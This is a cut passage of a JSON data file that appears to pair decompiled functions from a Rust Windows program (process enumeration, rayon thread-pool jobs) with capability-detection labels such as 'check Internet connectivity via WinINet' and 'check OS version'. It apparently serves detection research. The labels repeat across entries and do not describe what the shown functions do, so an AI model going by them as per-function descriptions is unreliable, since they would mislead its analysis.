+ 0x38);\n                iVar18 = *(iVar13 + 0x40);\n                iVar23 = *(iVar13 + 0x50);\n                iVar5 = *(iVar13 + 0x58);\n                uVar4 = *(iVar13 + 0x78);\n                uVar21 = *(iVar13 + 0x90);\n                *(&stack0x00000080 + iVar12) = iVar23;\n                puVar22 = **ppiVar3;\n                if (puVar22[5] == 0) break;\n                uVar20 = *puVar22;\n                uVar25 = puVar22[1];\n                *(&stack0xffffffffffffffb8 + iVar12) = 0x43b58c;\n                puVar14 = sym.core::hash::BuildHasher::hash_one::h2b336202073f8864(uVar20, uVar25, iVar23);\n                *(&stack0xffffffffffffffb8 + iVar12) = 0x43b59f;\n                iVar13 = sym.hashbrown::raw::RawTable_T_A_::get_mut::h822e361a6cec7342\n                                   (puVar22 + 2, puVar14, &stack0x00000080 + iVar12);\n                if (iVar13 == 0) {\n                    iVar23 = *(&stack0x00000080 + iVar12);\n                    break;\n                }\n                *(iVar13 + 0xa0) = uVar21 / 1000;\n                *(iVar13 + 0xa8) = uVar4 / 1000;\n                puVar14 = *ppiVar3[1];\n                *(&stack0xffffffffffffffb8 + iVar12) = 0x43b5e1;\n                sym.sysinfo::windows::process::compute_cpu_usage::hff2a421680c6be7f(iVar13 + 8, puVar14);\n                *(&stack0xffffffffffffffb8 + iVar12) = 0x43b5e9;\n                sym.sysinfo::windows::process::update_disk_usage::h06d1815b4f6f0dd5(iVar13 + 8);\n                *(iVar13 + 0x114) = 1;\ncode_r0x0043c09b:\n                *(&stack0x00000160 + iVar12) = *(&stack0x000001e0 + iVar12);\n                *(&stack0x00000164 + iVar12) = *(&stack0x000001e4 + iVar12);\n                *(&stack0x00000168 + iVar12) = *(&stack0x000001e8 + iVar12);\n                *(&stack0x0000016c + iVar12) = *(&stack0x000001ec + iVar12);\n            }\n            *(&stack0x00000200 + iVar12) = iVar23;\n            if (iVar18 == 0) {\n                if (iVar23 == 0) {\n                    *(&stack0xffffffffffffffb8 + iVar12) = 0x43b8dc;\n                    puVar15 = sym.alloc::raw_vec::RawVec_T_A_::allocate_in::he8311ff590a9cc21(4);\n                    *(&stack0x00000088 + iVar12) = puVar15;\n                    *(&stack0x00000090 + iVar12) = puVar14;\n                    *puVar15 = 0x656c6449;\n                    *(&stack0x00000098 + iVar12) = 4;\n                }\n                else if (iVar23 == 4) {\n                    *(&stack0xffffffffffffffb8 + iVar12) = 0x43b89e;\n                    puVar15 = sym.alloc::raw_vec::RawVec_T_A_::allocate_in::he8311ff590a9cc21(6);\n                    *(&stack0x00000088 + iVar12) = puVar15;\n                    *(&stack0x00000090 + iVar12) = puVar14;\n                    *puVar15 = *0x44c049;\n                    *(puVar15 + 1) = *0x44c04d;\n                    *(&stack0x00000098 + iVar12) = 6;\n                }\n                else {\n                    *(&stack0x00000810 + iVar12) = 0x44c428;\n                    *(&stack0x00000818 + iVar12) = 1;\n                    *(&stack0x00000820 + iVar12) = 0;\n                    *(&stack0x00000330 + iVar12) = &stack0x00000200 + iVar12;\n                    *(&stack0x00000338 + iVar12) =\n                         sym.core::fmt::num::imp::__impl_core::fmt::Display_for_u64_::fmt::hbcabcdd33be495c5;\n                    *(&stack0x00000830 + iVar12) = &stack0x00000330 + iVar12;\n                    *(&stack0x00000838 + iVar12) = 1;\n                    *(&stack0xffffffffffffffb8 + iVar12) = 0x43b974;\n                    sym.alloc::fmt::format::h5ed3f0bbcb495c5a(&stack0x00000088 + iVar12, &stack0x00000810 + iVar12);\n                }\n            }\n            else {\n                *(&stack0xffffffffffffffb8 + iVar12) = 0x43b627;\n                sym.alloc::string::String::from_utf16_lossy::hcf07ab31823adcce\n                          (&stack0x00000088 + iVar12, iVar18, uVar1 >> 1);\n            }\n            uVar6 = *(&stack0x00000080 + iVar12);\n            uVar21 = uVar21 / 1000;\n            if (uVar6 != 0) {\n                *(&stack0xffffffffffffffb8 + iVar12) = 0x43b66a;\n                iVar13 = sub.KERNEL32.dll_OpenProcess(0x410, 0, uVar6 & 0xffffffff);\n                if (iVar13 != 0) {\n                    *(&stack0x00000198 + iVar12) = uVar6;\n                    *(&stack0x000001a0 + iVar12) = uVar21;\n                    *(&stack0x000001a8 + iVar12) = iVar5 != 0;\n                    *(&stack0x000001b0 + iVar12) = iVar5;\n                    *(&stack0xfffffffffffffff8 + iVar12) = piVar19;\n                    *(&stack0x00000158 + iVar12) = 0;\n                    *(&stack0x00000810 + iVar12) = 0;\n                    *(&stack0xffffffffffffffe0 + iVar12) = 3;\n                    puVar14 = &stack0x00000810 + iVar12;\n                    *(&stack0xffffffffffffffb8 + iVar12) = 0x43b6d5;\n                    sub.PSAPI.DLL_EnumProcessModulesEx(iVar13, &stack0x00000158 + iVar12, 4, puVar14);\n                    uVar20 = *(&stack0x00000158 + iVar12);\n                    *(&stack0xffffffffffffffb8 + iVar12) = 0x43b6ed;\n                    sub.msvcrt.dll_memset(puVar14, 0, 0x20a);\n                    *(&stack0xffffffffffffffb8 + iVar12) = 0x43b701;\n                    sub.PSAPI.DLL_GetModuleFileNameExW(iVar13, uVar20, puVar14, 0x105);\n                    *(&stack0xffffffffffffffb8 + iVar12) = 0x43b717;\n                    sym.sysinfo::windows::process::null_terminated_wchar_to_string::h3d1cbefd382e8919\n                              (&stack0x00000330 + iVar12, puVar14, 0x105);\n                    *(&stack0x00000190 + iVar12) = *(&stack0x00000338 + iVar12);\n                    *(&stack0x00000188 + iVar12) = *(&stack0x00000340 + iVar12);\n                    *(&stack0xffffffffffffffb8 + iVar12) = 0x43b74f;\n                    sym.alloc::slice::__impl__T__::to_vec_in::h7a438101d708d965\n                              (&stack0x000001c0 + iVar12, *(&stack0x00000330 + iVar12), *(&stack0x00000340 + iVar12));\n                    uVar20 = *(&stack0x000001d0 + iVar12);\n                    *(&stack0xffffffffffffffb8 + iVar12) = 0x43b76d;\n                    dbg.parse_prefix(puVar14, *(&stack0x000001c0 + iVar12), uVar20);\n                    iVar2 = *((&stack0x00000810)[iVar12] * 4 + 0x43cb08);\n                    *(&stack0x00000050 + iVar12) = uVar20;\n    // WARNING: Could not recover jumptable at 0x0043b7a3. Too many branches\n    // WARNING: Treating indirect jump as call\n    // switch table (19 cases) at 0x43cb08\n                    (*(iVar2 + 0x43cb08))(6, *(&stack0x00000830 + iVar12));\n                    return;\n                }\n            }\n            *(&stack0x00000238 + iVar12) = CONCAT412(uVar32, CONCAT48(uVar30, CONCAT44(uVar28, uVar26)));\n            *(&stack0x00000270 + iVar12) = CONCAT412(uVar32, CONCAT48(uVar30, CONCAT44(uVar28, uVar26)));\n            *(&stack0x00000288 + iVar12) = CONCAT412(uVar32, CONCAT48(uVar30, CONCAT44(uVar28, uVar26)));\n            *(&stack0x000002d0 + iVar12) = CONCAT412(uVar32, CONCAT48(uVar30, CONCAT44(uVar28, uVar26)));\n            *(&stack0x000002c0 + iVar12) = CONCAT412(uVar32, CONCAT48(uVar30, CONCAT44(uVar28, uVar26)));\n            *(&stack0x00000210 + iVar12) = *(&stack0x00000098 + iVar12);\n            *(&stack0x00000200 + iVar12) = *(&stack0x00000088 + iVar12);\n            *(&stack0x00000204 + iVar12) = *(&stack0x0000008c + iVar12);\n            *(&stack0x00000208 + iVar12) = *(&stack0x00000090 + iVar12);\n            *(&stack0x0000020c + iVar12) = *(&stack0x00000094 + iVar12);\n            *(&stack0x00000218 + iVar12) = 8;\n            *(&stack0x00000220 + iVar12) = CONCAT412(uVar32, CONCAT48(uVar30, CONCAT44(uVar28, uVar26)));\n            *(&stack0x00000230 + iVar12) = 1;\n            *(&stack0x00000248 + iVar12) = uVar6;\n            *(&stack0x00000250 + iVar12) = 8;\n            *(&stack0x00000258 + iVar12) = CONCAT412(uVar32, CONCAT48(uVar30, CONCAT44(uVar28, uVar26)));\n            *(&stack0x00000268 + iVar12) = 1;\n            *(&stack0x00000280 + iVar12) = 1;\n            *(&stack0x00000298 + iVar12) = uVar21;\n            *(&stack0x000002a0 + iVar12) = uVar4 / 1000;\n            *(&stack0x000002a8 + iVar12) = iVar5 != 0;\n            *(&stack0x000002b0 + iVar12) = iVar5;\n            *(&stack0x000002b8 + iVar12) = 0;\n            *(&stack0x000002e0 + iVar12) = 0;\n            *(&stack0x00000308 + iVar12) = 0;\n            (&stack0x0000030c)[iVar12] = 1;\n            *(&stack0x000002f8 + iVar12) = CONCAT412(uVar32, CONCAT48(uVar30, CONCAT44(uVar28, uVar26)));\n            *(&stack0x000002e8 + iVar12) = CONCAT412(uVar32, CONCAT48(uVar30, CONCAT44(uVar28, uVar26)));\n            iVar13 = *ppiVar3[1];\n            puVar14 = &stack0x00000200 + iVar12;\n            *(&stack0xffffffffffffffb8 + iVar12) = 0x43c05c;\n            sym.sysinfo::windows::process::compute_cpu_usage::hff2a421680c6be7f(puVar14, iVar13);\n            *(&stack0xffffffffffffffb8 + iVar12) = 0x43c064;\n            sym.sysinfo::windows::process::update_disk_usage::h06d1815b4f6f0dd5(puVar14);\n            *(&stack0xffffffffffffffb8 + iVar12) = 0x43c07a;\n            sym.memcpy(&stack0x00000768 + iVar12, puVar14, 0xa8);\n            iVar13 = *(&stack0x000002a8 + iVar12);\n            puVar22 = &stack0x000002b0 + iVar12;\n            puVar24 = &stack0x00000fe0 + iVar12;\n            for (iVar18 = 0xc; iVar18 != 0; iVar18 = iVar18 + -1) {\n                *puVar24 = *puVar22;\n                puVar22 = puVar22 + 1;\n                puVar24 = puVar24 + 1;\n            }\n            if (iVar13 == 2) goto code_r0x0043c09b;\n            *(&stack0x00000330 + iVar12) = *(&stack0x00000058 + iVar12);\n            *(&stack0x00000338 + iVar12) = *(&stack0x000001e0 + iVar12);\n            *(&stack0x0000033c + iVar12) = *(&stack0x000001e4 + iVar12);\n            *(&stack0x00000340 + iVar12) = *(&stack0x000001e8 + iVar12);\n            *(&stack0x00000344 + iVar12) = *(&stack0x000001ec + iVar12);\n            puVar22 = &stack0x00000fe0 + iVar12;\n            puVar24 = &stack0x00000810 + iVar12;\n            for (iVar18 = 0xc; iVar18 != 0; iVar18 = iVar18 + -1) {\n                *puVar24 = *puVar22;\n                puVar22 = puVar22 + 1;\n                puVar24 = puVar24 + 1;\n            }\n            iVar18 = *(&stack0x00000340 + iVar12);\n            if (iVar18 == *(&stack0x00000338 + iVar12)) {\n                *(&stack0xffffffffffffffb8 + iVar12) = 0x43c106;\n                sym.alloc::raw_vec::RawVec_T_A_::reserve_for_push::ha056fc26143cdb23(&stack0x00000330 + iVar12, iVar18);\n                iVar23 = *(&stack0x00000330 + iVar12);\n                iVar18 = *(&stack0x00000340 + iVar12);\n            }\n            else {\n                iVar23 = *(&stack0x00000058 + iVar12);\n            }\n            puVar14 = &stack0x00000768 + iVar12;\n            *(&stack0xffffffffffffffb8 + iVar12) = 0x43c141;\n            sub.msvcrt.dll_memmove(iVar23 + iVar18 * 0x110, puVar14, 0xa8);\n            iVar23 = iVar23 + iVar18 * 0x110;\n            *(iVar23 + 0xa8) = iVar13;\n            puVar22 = &stack0x00000810 + iVar12;\n            puVar24 = iVar23 + 0xb0;\n            for (iVar13 = 0xc; iVar13 != 0; iVar13 = iVar13 + -1) {\n                *puVar24 = *puVar22;\n                puVar22 = puVar22 + 1;\n                puVar24 = puVar24 + 1;\n            }\n            *(&stack0x00000340 + iVar12) = *(&stack0x00000340 + iVar12) + 1;\n            *(&stack0x00000058 + iVar12) = *(&stack0x00000330 + iVar12);\n            *(&stack0x00000160 + iVar12) = *(&stack0x00000338 + iVar12);\n            *(&stack0x00000164 + iVar12) = *(&stack0x0000033c + iVar12);\n            *(&stack0x00000168 + iVar12) = *(&stack0x00000340 + iVar12);\n            *(&stack0x0000016c + iVar12) = *(&stack0x00000344 + iVar12);\n        } while( true );\n    }\n    uVar21 = in_RDX >> 1;\n    *(&stack0x00000768 + iVar12) = uVar21;\n    if (uVar21 <= uVar4) {\n        *(&stack0xffffffffffffffb8 + iVar12) = 0x43b486;\n        iVar13 = sym._ZN10rayon_core8registry12WorkerThread7current17ha0292caae0a3e38aE.358();\n        if (iVar13 == 0) {\n            *(&stack0xffffffffffffffb8 + iVar12) = 0x43c8a9;\n            piVar17 = sym.rayon_core::registry::global_registry::hf27dcebee1561694();\n            iVar13 = *piVar17;\n            *(&stack0xffffffffffffffb8 + iVar12) = 0x43c8b3;\n            iVar18 = sym.rayon_core::registry::Registry::in_worker_cold::LOCK_LATCH::__getit::h49b5ce437e8e4ca0(0);\n            if (iVar18 == 0) {\n                *(&stack0xffffffffffffffe0 + iVar12) = 0x44bc80;\n                *(&stack0xffffffffffffffb8 + iVar12) = 0x43cafe;\n                dbg.unwrap_failed(\"cannot access a Thread Local Storage value during or after destruction/rustc/a55dd71d5fb0ec5a6a3a9e8c27b2127ba491ce52\\\\library\\\\std\\\\src\\\\thread\\\\local.rs\"\n                                  , 0x46, &stack0x00000810 + iVar12, 0x44bce8);\n                do {\n                    invalidInstructionException();\n                } while( true );\n            }\n            piVar17 = &stack0x00000810 + iVar12;\n            *(&stack0x00000818 + iVar12) = &stack0x00000150 + iVar12;\n            *(&stack0x00000820 + iVar12) = &stack0x00000768 + iVar12;\n            *(&stack0x00000828 + iVar12) = puVar22;\n            *(&stack0x00000830 + iVar12) = piVar19 + uVar21;\n            *(&stack0x00000838 + iVar12) = uVar4 - uVar21;\n            *(&stack0x00000840 + iVar12) = ppiVar3;\n            *(&stack0x00000848 + iVar12) = &stack0x00000768 + iVar12;\n            *(&stack0x00000850 + iVar12) = puVar22;\n            *(&stack0x00000858 + iVar12) = piVar19;\n            *(&stack0x00000860 + iVar12) = uVar21;\n            *(&stack0x00000868 + iVar12) = ppiVar3;\n            *piVar17 = iVar18;\n            *(&stack0x00000870 + iVar12) = 0;\n            *(&stack0x00000330 + iVar12) = piVar17;\n            *(&stack0x00000338 + iVar12) =\n                 sym._rayon_core::job::StackJob_L_F_R__as_rayon_core::job::Job_::execute::ha057ba7ce74bf221;\n            *(&stack0xffffffffffffffb8 + iVar12) = 0x43c92a;\n            sym.rayon_core::registry::Registry::inject::hdc80ea30f1a1616c(iVar13 + 0x80, &stack0x00000330 + iVar12);\n            *(&stack0xffffffffffffffb8 + iVar12) = 0x43c932;\n            sym.rayon_core::latch::LockLatch::wait_and_reset::hfcd59c6d67e32b68(*piVar17);\n            uVar20 = *(&stack0x00000878 + iVar12);\n            piVar19 = *(&stack0x00000880 + iVar12);\n            if (*(&stack0x00000870 + iVar12) != 1) {\n                if (*(&stack0x00000870 + iVar12) != 0) {\n                    *(&stack0xffffffffffffffb8 + iVar12) = 0x43cb05;\n                    sym.rayon_core::unwind::resume_unwinding::hd67da9da3718f4fa(uVar20, piVar19);\n                    do {\n                        invalidInstructionException();\n                    } while( true );\n                }\n                arg1_00 = \n                \"internal error: entered unreachable codeC:\\\\Users\\\\Anonymous\\\\.cargo\\\\registry\\\\src\\\\github.com-1ecc6299db9ec823\\\\rayon-core-1.9.3\\\\src\\\\job.rs\"\n                ;\n                uVar25 = 0x44baf8;\n                uVar20 = 0x28;\n                goto code_r0x0043cacb;\n            }\n            *(&stack0x00000350 + iVar12) = *(&stack0x00000898 + iVar12);\n            *(&stack0x00000354 + iVar12) = *(&stack0x0000089c + iVar12);\n            *(&stack0x00000358 + iVar12) = *(&stack0x000008a0 + iVar12);\n            *(&stack0x0000035c + iVar12) = *(&stack0x000008a4 + iVar12);\n            *(&stack0x00000340 + iVar12) = *(&stack0x00000888 + iVar12);\n            *(&stack0x00000344 + iVar12) = *(&stack0x0000088c + iVar12);\n            *(&stack0x00000348 + iVar12) = *(&stack0x00000890 + iVar12);\n            *(&stack0x0000034c + iVar12) = *(&stack0x00000894 + iVar12);\n            *(&stack0x00000330 + iVar12) = uVar20;\n        }\n        else {\n            *(&stack0x00000810 + iVar12) = &stack0x00000150 + iVar12;\n            *(&stack0x00000818 + iVar12) = &stack0x00000768 + iVar12;\n            *(&stack0x00000820 + iVar12) = puVar22;\n            *(&stack0x00000828 + iVar12) = piVar19 + uVar21;\n            *(&stack0x00000830 + iVar12) = uVar4 - uVar21;\n            *(&stack0x00000838 + iVar12) = ppiVar3;\n            *(&stack0x00000840 + iVar12) = &stack0x00000768 + iVar12;\n            *(&stack0x00000848 + iVar12) = puVar22;\n            *(&stack0x00000850 + iVar12) = piVar19;\n            *(&stack0x00000858 + iVar12) = uVar21;\n            *(&stack0x00000860 + iVar12) = ppiVar3;\n            *(&stack0xffffffffffffffb8 + iVar12) = 0x43b4e8;\n            sym.rayon_core::join::join_context::__u7b__u7b_closure_u7d__u7d_::hc886b3f3eb32bd53\n                      (&stack0x00000330 + iVar12, &stack0x00000810 + iVar12, iVar13, 0);\n            uVar20 = *(&stack0x00000330 + iVar12);\n            piVar19 = *(&stack0x00000338 + iVar12);\n        }\n        puVar22 = *(&stack0x00000048 + iVar12);\n        iVar13 = *(&stack0x00000340 + iVar12);\n        *(&stack0x00000210 + iVar12) = *(&stack0x00000358 + iVar12);\n        *(&stack0x00000200 + iVar12) = *(&stack0x00000348 + iVar12);\n        *(&stack0x00000204 + iVar12) = *(&stack0x0000034c + iVar12);\n        *(&stack0x00000208 + iVar12) = *(&stack0x00000350 + iVar12);\n        *(&stack0x0000020c + iVar12) = *(&stack0x00000354 + iVar12);\n        *(&stack0x00000820 + iVar12) = *(&stack0x00000358 + iVar12);\n        *(&stack0x00000810 + iVar12) = *(&stack0x00000348 + iVar12);\n        *(&stack0x00000814 + iVar12) = *(&stack0x0000034c + iVar12);\n        *(&stack0x00000818 + iVar12) = *(&stack0x00000350 + iVar12);\n        *(&stack0x0000081c + iVar12) = *(&stack0x00000354 + iVar12);\n        if (piVar19 == NULL) {\n            uVar25 = *(&stack0x00000810 + iVar12);\n            piVar19 = *(&stack0x00000818 + iVar12);\n            iVar18 = *(&stack0x00000820 + iVar12);\n            *(&stack0x00000810 + iVar12) = uVar20;\n            *(&stack0x00000818 + iVar12) = 0;\n            *(&stack0x00000820 + iVar12) = iVar13;\n        }\n        else {\n            iVar23 = *(&stack0x00000810 + iVar12);\n            *(&stack0x00000810 + iVar12) = 0;\n            iVar18 = iVar13;\n            uVar25 = uVar20;\n            if (iVar23 != 0) {\n                *piVar19 = iVar23;\n                *(iVar23 + 8) = piVar19;\n                piVar19 = *(&stack0x00000818 + iVar12);\n                iVar18 = iVar13 + *(&stack0x00000820 + iVar12);\n                *(&stack0x00000818 + iVar12) = ZEXT816(0);\n            }\n        }\n        *puVar22 = uVar25;\n        puVar22[1] = piVar19;\n        puVar22[2] = iVar18;\n        *(&stack0xffffffffffffffb8 + iVar12) = 0x43ca40;\n        sym._alloc::collections::linked_list::LinkedList_T__as_core::ops::drop::Drop_::drop::hb16d65907ff622dd\n                  (&stack0x00000810 + iVar12);\n        return;\n    }\n    arg1_00 = \"assertion failed: mid <= self.len()called `Option::unwrap()` on a `None` value\";\n    uVar25 = 0x44bec0;\n    uVar20 = 0x23;\ncode_r0x0043cacb:\n    *(&stack0xffffffffffffffb8 + iVar12) = 0x43cad0;\n    dbg.panic(arg1_00, uVar20, uVar25);\n    do {\n        invalidInstructionException();\n    } while( true );\n}\n",
        "token_count": 8114
    },
    "c886b3f3": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid sym.rayon_core::join::join_context::__u7b__u7b_closure_u7d__u7d_::hc886b3f3eb32bd53\n               (ulong *arg1, uint *arg2, int64_t arg3, ulong arg4)\n\n{\n    code **ppcVar1;\n    ulong uVar2;\n    ulong uVar3;\n    int64_t *piVar4;\n    int64_t iVar5;\n    code *pcVar6;\n    code ***pppcVar7;\n    ulong var_8h;\n    ulong var_10h;\n    ulong var_30h;\n    ulong var_38h;\n    ulong var_40h;\n    ulong var_48h;\n    int64_t aiStack392 [3];\n    uchar uStack368;\n    uint uStack360;\n    uint uStack356;\n    uint uStack352;\n    uint uStack348;\n    uint uStack344;\n    uint uStack340;\n    uint uStack336;\n    uint uStack332;\n    uint uStack328;\n    uint uStack324;\n    uint uStack320;\n    uint uStack316;\n    int64_t iStack312;\n    ulong uStack304;\n    ulong uStack296;\n    ulong uStack288;\n    code **appcStack280 [4];\n    uint uStack248;\n    uint uStack244;\n    uint uStack240;\n    uint uStack236;\n    uint uStack232;\n    uint uStack228;\n    uint uStack224;\n    uint uStack220;\n    uint uStack216;\n    uint uStack212;\n    uint uStack208;\n    uint uStack204;\n    uchar auStack200 [32];\n    uint uStack168;\n    uint uStack164;\n    uint uStack160;\n    uint uStack156;\n    uint uStack152;\n    uint uStack148;\n    uint uStack144;\n    uint uStack140;\n    uint uStack136;\n    uint uStack132;\n    uint uStack128;\n    uint uStack124;\n    uchar auStack112 [48];\n    \n    // rayon_core::join::join_context::_$u7b$$u7b$closure$u7d$$u7d$::hc886b3f3eb32bd53\n    uStack360 = *arg2;\n    uStack356 = arg2[1];\n    uStack352 = arg2[2];\n    uStack348 = arg2[3];\n    uStack344 = arg2[4];\n    uStack340 = arg2[5];\n    uStack336 = arg2[6];\n    uStack332 = arg2[7];\n    uStack328 = arg2[8];\n    uStack324 = arg2[9];\n    uStack320 = arg2[10];\n    uStack316 = arg2[0xb];\n    aiStack392[2] = *(arg3 + 0x120);\n    aiStack392[0] = 0;\n    aiStack392[1] = arg3 + 0x130;\n    uStack368 = 0;\n    iStack312 = 0;\n    sym.rayon_core::registry::WorkerThread::push::hc46630348a5b073a\n              (arg3, aiStack392, \n               sym._rayon_core::job::StackJob_L_F_R__as_rayon_core::job::Job_::execute::haffce8dd07d2b5a6);\n    appcStack280[0] = *(arg2 + 0xc);\n    appcStack280[1] = *(arg2 + 0xe);\n    appcStack280[2] = *(arg2 + 0x10);\n    pcVar6 = *appcStack280[0];\n    sym.rayon::iter::plumbing::bridge_producer_consumer::helper::hd38c8e70ff773f4b(appcStack280);\n    uVar3 = appcStack280[2];\n    uVar2 = appcStack280[1];\n    ppcVar1 = appcStack280[0];\n    do {\n        if (aiStack392[0] == 3) {\ncode_r0x0043ccac:\n            *arg1 = ppcVar1;\n            arg1[1] = uVar2;\n            arg1[2] = uVar3;\n            if (iStack312 == 1) {\n                arg1[3] = uStack304;\n                arg1[4] = uStack296;\n                arg1[5] = uStack288;\n                return;\n            }\n            if (iStack312 != 0) {\n                sym.rayon_core::unwind::resume_unwinding::hd67da9da3718f4fa(uStack304, uStack296);\n                do {\n                    invalidInstructionException();\n                } while( true );\n            }\n            dbg.panic(\"internal error: entered unreachable codeC:\\\\Users\\\\Anonymous\\\\.cargo\\\\registry\\\\src\\\\github.com-1ecc6299db9ec823\\\\rayon-core-1.9.3\\\\src\\\\job.rs\"\n                      , 0x28, 0x44baf8);\n            do {\n                invalidInstructionException();\n            } while( true );\n        }\n        piVar4 = sym.crossbeam_deque::deque::Worker_T_::pop::heffa62d1c96fb557(arg3 + 0x100);\n        if (pcVar6 == NULL) {\n            sym.rayon_core::registry::WorkerThread::wait_until::h373d85f342d65a84(arg3, aiStack392);\n            goto code_r0x0043ccac;\n        }\n        if ((piVar4 == aiStack392) &&\n           (pcVar6 == sym._rayon_core::job::StackJob_L_F_R__as_rayon_core::job::Job_::execute::haffce8dd07d2b5a6)) {\n            piVar4 = aiStack392;\n            pppcVar7 = appcStack280;\n            for (iVar5 = 0xe; iVar5 != 0; iVar5 = iVar5 + -1) {\n                *pppcVar7 = *piVar4;\n                piVar4 = piVar4 + 1;\n                pppcVar7 = pppcVar7 + 1;\n            }\n            uStack136 = uStack216;\n            uStack132 = uStack212;\n            uStack128 = uStack208;\n            uStack124 = uStack204;\n            uStack152 = uStack232;\n            uStack148 = uStack228;\n            uStack144 = uStack224;\n            uStack140 = uStack220;\n            uStack168 = uStack248;\n            uStack164 = uStack244;\n            uStack160 = uStack240;\n            uStack156 = uStack236;\n            sym.core::option::Option_T_::unwrap::h9626077523606ac7(auStack112, &uStack168, 0x44bb10);\n            sym.rayon_core::join::join_context::call_b::__u7b__u7b_closure_u7d__u7d_::h4287d59a64d6a8d7\n                      (arg1 + 3, auStack112);\n            sym._ZN4core3ptr163drop_in_place_LT_rayon_core..job..JobResult_LT_alloc..collections..linked_list..LinkedList_LT_alloc..vec..Vec_L\n                      (auStack200);\n            *arg1 = ppcVar1;\n            arg1[1] = uVar2;\n            arg1[2] = uVar3;\n            return;\n        }\n        (*pcVar6)(piVar4);\n    } while( true );\n}\n",
        "token_count": 1661
    },
    "a057ba7c": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid sym._rayon_core::job::StackJob_L_F_R__as_rayon_core::job::Job_::execute::ha057ba7ce74bf221(int64_t *arg1)\n\n{\n    int64_t iVar1;\n    int64_t iVar2;\n    char *arg1_00;\n    ulong arg2;\n    int64_t *piVar3;\n    int64_t *piVar4;\n    ulong arg3;\n    ulong in_R9;\n    ulong uStack296;\n    uint uStack288;\n    uint uStack284;\n    uint uStack280;\n    uint uStack276;\n    uint uStack272;\n    uint uStack268;\n    int64_t aiStack208 [10];\n    int64_t iStack128;\n    int64_t aiStack120 [2];\n    uint uStack104;\n    uint uStack100;\n    uint uStack96;\n    uint uStack92;\n    uint uStack88;\n    uint uStack84;\n    ulong uStack72;\n    int64_t iStack56;\n    int64_t iStack48;\n    \n    // <rayon_core::job::StackJob<L,F,R> as rayon_core::job::Job>::execute::ha057ba7ce74bf221\n    uStack296 = arg1[1];\n    arg1[1] = 0;\n    if (uStack296 == 0) {\n        arg1_00 = 0x44bcbb;\n        arg3 = 0x44bea8;\n        arg2 = 0x2b;\n    }\n    else {\n        piVar3 = arg1 + 2;\n        piVar4 = aiStack120;\n        for (iVar1 = 10; iVar1 != 0; iVar1 = iVar1 + -1) {\n            *piVar4 = *piVar3;\n            piVar3 = piVar3 + 1;\n            piVar4 = piVar4 + 1;\n        }\n        piVar3 = arg1 + 2;\n        piVar4 = aiStack208;\n        iStack128 = uStack296;\n        for (iVar1 = 10; iVar1 != 0; iVar1 = iVar1 + -1) {\n            *piVar4 = *piVar3;\n            piVar3 = piVar3 + 1;\n            piVar4 = piVar4 + 1;\n        }\n        iVar1 = sym._ZN10rayon_core8registry12WorkerThread7current17ha0292caae0a3e38aE.358();\n        if (iVar1 != 0) {\n            piVar3 = aiStack208;\n            piVar4 = &uStack288;\n            for (iVar2 = 10; iVar2 != 0; iVar2 = iVar2 + -1) {\n                *piVar4 = *piVar3;\n                piVar3 = piVar3 + 1;\n                piVar4 = piVar4 + 1;\n            }\n            sym.rayon_core::join::join_context::__u7b__u7b_closure_u7d__u7d_::hc886b3f3eb32bd53\n                      (&iStack128, &uStack296, iVar1, CONCAT71(in_R9 >> 8, 1));\n            iVar1 = iStack128;\n            uStack296 = aiStack120[1];\n            uStack288 = uStack104;\n            uStack284 = uStack100;\n            uStack280 = uStack96;\n            uStack276 = uStack92;\n            uStack272 = uStack88;\n            uStack268 = uStack84;\n            if (arg1[0xc] != 0) {\n                if (arg1[0xc] == 1) {\n                    sym._alloc::collections::linked_list::LinkedList_T__as_core::ops::drop::Drop_::drop::hb16d65907ff622dd\n                              (arg1 + 0xd);\n                    sym._alloc::collections::linked_list::LinkedList_T__as_core::ops::drop::Drop_::drop::hb16d65907ff622dd\n                              (arg1 + 0x10);\n                }\n                else {\n                    sym.core::ptr::drop_in_place_alloc::boxed::Box_dyn_core::any::Anycore::marker::Send__::h8a4da361118e5d8e\n                              (arg1 + 0xd);\n                }\n            }\n            arg1[0xc] = 1;\n            arg1[0xd] = iVar1;\n            arg1[0xe] = aiStack120[0];\n            *(arg1 + 0xf) = uStack296;\n            *(arg1 + 0x7c) = uStack296._4_4_;\n            *(arg1 + 0x10) = uStack288;\n            *(arg1 + 0x84) = uStack284;\n            *(arg1 + 0x11) = uStack280;\n            *(arg1 + 0x8c) = uStack276;\n            *(arg1 + 0x12) = uStack272;\n            *(arg1 + 0x94) = uStack268;\n            iVar1 = *arg1;\n            aiStack120[1] = 0x43d000;\n            sym.std::sync::mutex::Mutex_T_::lock::h62098323f0fb8253(&iStack56, iVar1);\n            if (iStack56 == 0) {\n                *(iStack48 + 9) = 1;\n                aiStack120[1] = 0x43d02a;\n                sub.KERNEL32.dll_WakeAllConditionVariable(iVar1 + 0x10);\n                aiStack120[1] = 0x43d032;\n                sym.core::ptr::drop_in_place_std::sync::mutex::MutexGuard_bool__::hb58323b4d892ef68\n                          (&stack0xffffffffffffffe0);\n                return;\n            }\n            uStack72 = 0x44be90;\n            aiStack120[1] = 0x43d073;\n            dbg.unwrap_failed(\"called `Result::unwrap()` on an `Err` value\", 0x2b, &stack0xffffffffffffffe0, 0x44bd58);\n            do {\n                invalidInstructionException();\n            } while( true );\n        }\n        arg1_00 = \n        \"assertion failed: injected && !worker_thread.is_null()C:\\\\Users\\\\Anonymous\\\\.cargo\\\\registry\\\\src\\\\github.com-1ecc6299db9ec823\\\\rayon-core-1.9.3\\\\src\\\\registry.rs\"\n        ;\n        arg3 = 0x44bbd0;\n        arg2 = 0x36;\n    }\n    dbg.panic(arg1_00, arg2, arg3);\n    do {\n        invalidInstructionException();\n    } while( true );\n}\n",
        "token_count": 1486
    },
    "0cc38cac": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
